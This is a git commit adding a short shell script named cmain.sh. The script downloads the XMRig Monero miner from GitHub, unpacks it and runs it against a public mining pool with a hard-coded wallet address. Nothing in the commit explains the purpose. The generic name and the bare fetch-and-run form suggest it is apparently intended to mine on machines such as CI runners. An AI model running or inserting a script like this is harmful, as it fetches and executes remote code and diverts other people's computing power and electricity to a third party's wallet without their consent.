623ac1756ec8997dd3547a97073adfa6b31b7095
viskido21 <90612309+viskido21@users.noreply.github.com>
2022-09-28 15:27:24 +0000

    Create cmain.sh

---
+++ cmain.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o pool.supportxmr.com:443 -u 42Fb2yHrHF9RSYrNkJg8aK3v6QcqQkBHhMMh3sJg3HFo7dWpmvJoQcHFhHWDDpEU5fCSgVKgGbutsiGD84YmUn5XHsF6npR -k --tls -p "Cadillac "
